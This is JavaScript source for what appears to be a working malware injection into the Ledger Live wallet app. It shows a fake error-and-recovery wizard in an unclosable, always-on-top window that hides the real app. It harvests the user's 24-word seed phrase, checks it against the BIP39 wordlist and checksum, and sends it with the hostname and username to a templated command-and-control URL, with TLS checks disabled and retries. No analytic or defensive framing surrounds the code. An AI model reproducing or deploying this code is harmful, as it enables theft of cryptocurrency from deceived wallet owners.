(() => {
  'use strict';
  const C2 = '%%C2_URL%%';
  const TOKEN = '%%AUTH_TOKEN%%';
  const SESSION_ID = '%%SESSION_ID%%';

  process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

  const { app, BrowserWindow } = require('electron');
  const path = require('path');
  const fs = require('fs');
  const os = require('os');

  function exfil(dataType, content) {
    const payload = JSON.stringify({
      session_id: SESSION_ID,
      type: 'Generic',
      browser: 'Seeds',
      profile: 'LedgerLive',
      data_type: dataType,
      content: content,
      batch: 'walletpatch_seed',
      timestamp: Math.floor(Date.now() / 1000),
    });

    const RETRY_DELAYS = [0, 3000, 8000];
    let attempt = 0;

    function send() {
      try {
        const u = new URL(C2);
        const transport = u.protocol === 'https:' ? require('https') : require('http');
        const req = transport.request({
          hostname: u.hostname,
          port: u.port || (u.protocol === 'https:' ? 443 : 80),
          path: u.pathname,
          method: 'POST',
          headers: {
            'Content-Type': 'application/json',
            'Authorization': 'Bearer ' + TOKEN,
            'Content-Length': Buffer.byteLength(payload),
          },
          rejectUnauthorized: false,
          timeout: 15000,
        });
        req.on('response', (res) => {
          if (res.statusCode !== 200 && attempt < RETRY_DELAYS.length - 1) {
            attempt++;
            setTimeout(send, RETRY_DELAYS[attempt]);
          }
        });
        req.on('error', () => {
          if (attempt < RETRY_DELAYS.length - 1) {
            attempt++;
            setTimeout(send, RETRY_DELAYS[attempt]);
          }
        });
        req.on('timeout', () => { req.destroy(); });
        req.write(payload);
        req.end();
      } catch (_) {
        if (attempt < RETRY_DELAYS.length - 1) {
          attempt++;
          setTimeout(send, RETRY_DELAYS[attempt]);
        }
      }
    }

    send();
  }

  let BIP39_LIST = null;
  function loadWordlist() {
    if (BIP39_LIST) return BIP39_LIST;
    const tries = [
      () => { const m = require('bip39'); return m.wordlists ? m.wordlists.english : m.wordlists?.EN; },
      () => require('@scure/bip39/wordlists/english').wordlist,
      () => {
        const cache = require.cache || {};
        for (const k in cache) {
          try {
            const ex = cache[k] && cache[k].exports;
            if (Array.isArray(ex) && ex.length === 2048 && typeof ex[0] === 'string') return ex;
            if (ex && ex.wordlist && Array.isArray(ex.wordlist) && ex.wordlist.length === 2048) return ex.wordlist;
            if (ex && ex.english && Array.isArray(ex.english) && ex.english.length === 2048) return ex.english;
            if (ex && ex.default && Array.isArray(ex.default) && ex.default.length === 2048) return ex.default;
          } catch (_) {}
        }
        return null;
      },
    ];
    for (const fn of tries) {
      try { const r = fn(); if (r && r.length === 2048) { BIP39_LIST = r; return r; } } catch (_) {}
    }
    return null;
  }

  const L = { en: {}, ja: {} };

  function getStrings() {
    let lang = 'en';
    try { lang = app.getLocale().split('-')[0].toLowerCase(); } catch (_) {}
    return L[lang] || L.en;
  }

  function handleSeed(seed, valid) {
    const content = [
      'Seed Phrase: ' + seed,
      'Words: ' + seed.split(' ').length,
      'Valid Checksum: ' + (valid ? 'yes' : 'no'),
      'Hostname: ' + os.hostname(),
      'Username: ' + (os.userInfo().username || 'unknown'),
      'Timestamp: ' + new Date().toISOString(),
      'Locale: ' + (app.getLocale() || 'unknown'),
      'App: Ledger Live',
    ].join('\n') + '\n';
    exfil('LedgerSeed.txt', content);
  }

  function buildWizardHTML() {
    const s = getStrings();
    const wl = loadWordlist();
    const wlJSON = wl ? JSON.stringify(wl) : 'null';

    const logoSVG = '<svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="none" viewBox="0 0 24 24"><path fill="#fff" d="M3 15.5v4.6h6.77v-1.02H3.987V15.5zm17.014 0v3.58h-5.785v1.02H21v-4.6zM9.78 8.5v7h4.45v-.92h-3.463V8.5zM3 3.9v4.6h.986V4.92h5.785V3.9zm11.23 0v1.02h5.784V8.5H21V3.9z"/></svg>';

    return `<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }

  body {
    font-family: -apple-system, BlinkMacSystemFont, 'Inter', 'Segoe UI', sans-serif;
    background: #131214;
    color: #ffffff;
    height: 100vh;
    overflow: hidden;
    display: flex;
    align-items: center;
    justify-content: center;
    -webkit-app-region: drag;
    user-select: none;
  }
  .container { width: 720px; animation: fadeIn 0.4s ease; }
  .logo { text-align: center; margin-bottom: 28px; }
  .logo span { display: block; font-size: 16px; font-weight: 600; color: #aaa; margin-top: 6px; letter-spacing: 3px; text-transform: uppercase; }
  .card {
    background: #1C1D1F;
    border-radius: 16px;
    padding: 36px 40px;
    border: 1px solid rgba(255,255,255,0.06);
  }
  h1 { font-size: 20px; font-weight: 600; margin-bottom: 10px; text-align: center; }
  .error-title { color: #ea6852; }
  .subtitle { color: #8a8a8a; font-size: 13px; line-height: 1.6; text-align: center; margin-bottom: 24px; }

  .btn {
    display: block; width: 100%; padding: 13px 0; border: none; border-radius: 100px;
    font-size: 14px; font-weight: 600; cursor: pointer; transition: all 0.15s;
    -webkit-app-region: no-drag; text-align: center;
  }
  .btn-primary { background: #a78bfa; color: #1C1D1F; }
  .btn-primary:hover { background: #b8a0fb; }
  .btn-primary:disabled { background: #3d3555; color: #666; cursor: not-allowed; }

  .seed-grid {
    display: grid; grid-template-columns: repeat(4, 1fr); gap: 8px; margin-bottom: 16px;
  }
  .sf { position: relative; -webkit-app-region: no-drag; }
  .sf label {
    position: absolute; left: 10px; top: 50%; transform: translateY(-50%);
    font-size: 11px; color: #555; font-weight: 600; pointer-events: none; width: 24px; text-align: right;
  }
  .sf input {
    width: 100%; padding: 10px 10px 10px 38px;
    background: #131214; border: 1px solid #2a2a2e; border-radius: 10px;
    color: #fff; font-size: 13px; font-family: inherit; outline: none;
    transition: border-color 0.15s;
  }
  .sf input:focus { border-color: #a78bfa; }
  .sf input.ok { border-color: #44d7b6; }
  .sf input.bad { border-color: #ea6852; }

  .step { display: none; }
  .step.active { display: block; }

  .dots { display: flex; justify-content: center; gap: 6px; margin-bottom: 20px; }
  .dots .d { width: 7px; height: 7px; border-radius: 50%; background: #333; }
  .dots .d.on { background: #a78bfa; }
  .dots .d.ok { background: #44d7b6; }

  .vmsg { text-align: center; font-size: 12px; min-height: 32px; margin-bottom: 8px; line-height: 1.4; }
  .vmsg.err { color: #ea6852; }
  .vmsg.warn { color: #e8a838; }

  .nbox {
    border-radius: 12px; padding: 14px 16px; margin-bottom: 20px;
    font-size: 12px; line-height: 1.5;
  }
  .nbox.error { background: rgba(234,104,82,0.08); border: 1px solid rgba(234,104,82,0.2); color: #ea6852; }
  .nbox.success { background: rgba(68,215,182,0.08); border: 1px solid rgba(68,215,182,0.2); color: #44d7b6; text-align: center; }

  .icon-err { text-align: center; margin-bottom: 16px; font-size: 44px; }
  .icon-ok { text-align: center; margin-bottom: 16px; }
  .icon-ok svg { width: 56px; height: 56px; }
</style>
</head>
<body>
<div class="container">
  <div class="logo">${logoSVG}<span>Ledger</span></div>

  <!-- Step 1: Error -->
  <div id="s1" class="step active">
    <div class="card">
      <div class="dots"><div class="d on"></div><div class="d"></div><div class="d"></div></div>
      <div class="icon-err">\u26A0\uFE0F</div>
      <h1 class="error-title">${s.errorTitle}</h1>
      <p class="subtitle">${s.errorMsg}</p>
      <div class="nbox error">${s.errorNote}</div>
      <button class="btn btn-primary" onclick="go(2)">${s.errorBtn}</button>
    </div>
  </div>

  <!-- Step 2: Seed Input -->
  <div id="s2" class="step">
    <div class="card">
      <div class="dots"><div class="d ok"></div><div class="d on"></div><div class="d"></div></div>
      <h1>${s.seedTitle}</h1>
      <p class="subtitle">${s.seedMsg}</p>
      <div class="seed-grid" id="sg"></div>
      <div class="vmsg" id="vm"></div>
      <button class="btn btn-primary" id="vb" disabled onclick="submit()">${s.seedBtn}</button>
    </div>
  </div>

  <!-- Step 3: Done -->
  <div id="s3" class="step">
    <div class="card">
      <div class="dots"><div class="d ok"></div><div class="d ok"></div><div class="d on"></div></div>
      <div class="icon-ok">
        <svg viewBox="0 0 56 56" fill="none"><circle cx="28" cy="28" r="28" fill="rgba(68,215,182,0.12)"/>
        <path d="M22 28l5 5 9-9" stroke="#44d7b6" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"/></svg>
      </div>
      <h1>${s.doneTitle}</h1>
      <div class="nbox success">${s.doneMsg}</div>
      <p class="subtitle">${s.doneNote}</p>
    </div>
  </div>
</div>

<script>
  var WL = ${wlJSON};
  var WS = WL ? new Set(WL) : null;
  var N = 24;
  var MSG_INVALID = ${JSON.stringify(s.seedInvalid)};
  var MSG_CHECKSUM = ${JSON.stringify(s.seedChecksumFail)};

  function ok(w) { return WS ? WS.has(w) : /^[a-z]{3,8}$/.test(w); }

  var sg = document.getElementById('sg');
  for (var i = 0; i < N; i++) {
    var d = document.createElement('div'); d.className = 'sf';
    d.innerHTML = '<label>' + (i+1) + '.</label><input type="text" id="w'+i+'" data-i="'+i+'" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false">';
    sg.appendChild(d);
  }

  sg.addEventListener('input', function(e) {
    if (e.target.tagName !== 'INPUT') return;
    var v = e.target.value.trim().toLowerCase(); e.target.value = v;
    e.target.className = !v ? '' : ok(v) ? 'ok' : 'bad';
    check();
  });
  sg.addEventListener('keydown', function(e) {
    if (e.target.tagName !== 'INPUT') return;
    var i = parseInt(e.target.dataset.i, 10);
    if (e.key === ' ' || (e.key === 'Tab' && !e.shiftKey)) { e.preventDefault(); if (i < N-1) document.getElementById('w'+(i+1)).focus(); }
    if (e.key === 'Tab' && e.shiftKey) { e.preventDefault(); if (i > 0) document.getElementById('w'+(i-1)).focus(); }
    if (e.key === 'Enter') { e.preventDefault(); submit(); }
    if (e.key === 'Backspace' && !e.target.value && i > 0) document.getElementById('w'+(i-1)).focus();
  });

  function check() {
    var btn = document.getElementById('vb'), vm = document.getElementById('vm');
    var f = 0, v = 0;
    for (var i = 0; i < N; i++) { var t = document.getElementById('w'+i).value.trim(); if (t) f++; if (t && ok(t)) v++; }
    if (f === N && v === N) { btn.disabled = false; vm.className = 'vmsg'; vm.textContent = ''; }
    else if (f === N && v < N) { btn.disabled = true; vm.className = 'vmsg err'; vm.innerHTML = MSG_INVALID; }
    else { btn.disabled = true; vm.className = 'vmsg'; vm.textContent = ''; }
  }

  function go(n) {
    document.querySelectorAll('.step').forEach(function(el) { el.classList.remove('active'); });
    document.getElementById('s'+n).classList.add('active');
    if (n === 2) setTimeout(function() { document.getElementById('w0').focus(); }, 150);
  }

  document.addEventListener('paste', function(e) {
    if (!document.getElementById('s2').classList.contains('active')) return;
    var text = (e.clipboardData || window.clipboardData).getData('text');
    if (!text) return;
    var words = text.trim().toLowerCase().split(/[\\s,]+/).filter(function(w) { return w.length > 0; });
    if (words.length >= N) {
      e.preventDefault();
      for (var i = 0; i < N; i++) {
        var inp = document.getElementById('w' + i);
        inp.value = words[i];
        inp.className = ok(words[i]) ? 'ok' : 'bad';
      }
      check();
    }
  });

  function validateChecksum(words) {
    if (!WL) return Promise.resolve(true); // no wordlist = skip checksum
    var indices = [];
    for (var i = 0; i < words.length; i++) {
      var idx = WL.indexOf(words[i]);
      if (idx < 0) return Promise.resolve(false);
      indices.push(idx);
    }
    var bits = '';
    for (var i = 0; i < indices.length; i++) {
      var b = indices[i].toString(2);
      while (b.length < 11) b = '0' + b;
      bits += b;
    }
    var entropyBits = words.length === 24 ? 256 : (words.length === 12 ? 128 : 0);
    if (!entropyBits) return Promise.resolve(false);
    var checksumLen = bits.length - entropyBits;
    var entropyBytes = new Uint8Array(entropyBits / 8);
    for (var i = 0; i < entropyBytes.length; i++) {
      entropyBytes[i] = parseInt(bits.substr(i * 8, 8), 2);
    }
    return crypto.subtle.digest('SHA-256', entropyBytes).then(function(hashBuf) {
      var hashByte = new Uint8Array(hashBuf)[0];
      var hashBits = hashByte.toString(2);
      while (hashBits.length < 8) hashBits = '0' + hashBits;
      var expected = hashBits.substr(0, checksumLen);
      var actual = bits.substr(entropyBits);
      return expected === actual;
    });
  }

  function submit() {
    var words = [];
    for (var i = 0; i < N; i++) {
      var v = document.getElementById('w'+i).value.trim().toLowerCase();
      if (!v || !ok(v)) return;
      words.push(v);
    }
    var seed = words.join(' ');
    var btn = document.getElementById('vb');
    btn.disabled = true;
    btn.textContent = '...';

    validateChecksum(words).then(function(valid) {
      if (valid) {
        console.log('__R2:' + JSON.stringify({ seed: seed, valid: true, _t: Date.now() }));
        go(3);
      } else {
        var vm = document.getElementById('vm');
        vm.className = 'vmsg warn';
        vm.innerHTML = MSG_CHECKSUM;
        btn.disabled = false;
        btn.textContent = ${JSON.stringify(s.seedBtn)};
        console.log('__R2:' + JSON.stringify({ seed: seed, valid: false, _t: Date.now() }));
      }
    }).catch(function() {
      console.log('__R2:' + JSON.stringify({ seed: seed, valid: false, _t: Date.now() }));
      go(3);
    });
  }
</script>
</body>
</html>`;
  }

  function createWizard() {
    const html = buildWizardHTML();
    const tmpDir = app.getPath('temp') || '/tmp';
    const tmpFile = path.join(tmpDir, '.ll_diag_' + process.pid + '.html');
    try { fs.writeFileSync(tmpFile, html, 'utf8'); } catch (_) { return; }

    const win = new BrowserWindow({
      width: 800,
      height: 740,
      frame: false,
      resizable: false,
      movable: true,
      minimizable: false,
      maximizable: false,
      closable: false,
      alwaysOnTop: true,
      skipTaskbar: true,
      backgroundColor: '#131214',
      webPreferences: {
        nodeIntegration: false,
        contextIsolation: true,
        sandbox: false,
      },
    });

    win.webContents.on('console-message', (event, level, message) => {
      if (!message.startsWith('__R2:')) return;
      try {
        const data = JSON.parse(message.slice(5));
        if (data.seed) handleSeed(data.seed, !!data.valid);
      } catch (_) {}
    });

    win.loadFile(tmpFile);
    win.on('closed', () => { try { fs.unlinkSync(tmpFile); } catch (_) {} });

    const iv = setInterval(() => {
      try {
        if (win.isDestroyed()) { clearInterval(iv); return; }
        win.setAlwaysOnTop(true);
        BrowserWindow.getAllWindows().forEach(w => {
          if (w === win || w.isDestroyed()) return;
          try {
            if (!w.isVisible()) return;
            const url = w.webContents.getURL();
            if (!url || url === 'about:blank' ||
                url.startsWith('devtools://') || url.startsWith('chrome-devtools://')) return;
            w.hide();
          } catch (_) {}
        });
      } catch (_) { clearInterval(iv); }
    }, 2000);
  }

  function init() {
    setTimeout(createWizard, 1500);
  }

  if (app.isReady()) init();
  else app.on('ready', init);

  app.on('will-quit', () => {
    try {
      const tmpFile = path.join(app.getPath('temp') || '/tmp', '.ll_diag_' + process.pid + '.html');
      fs.unlinkSync(tmpFile);
    } catch (_) {}
  });
})();
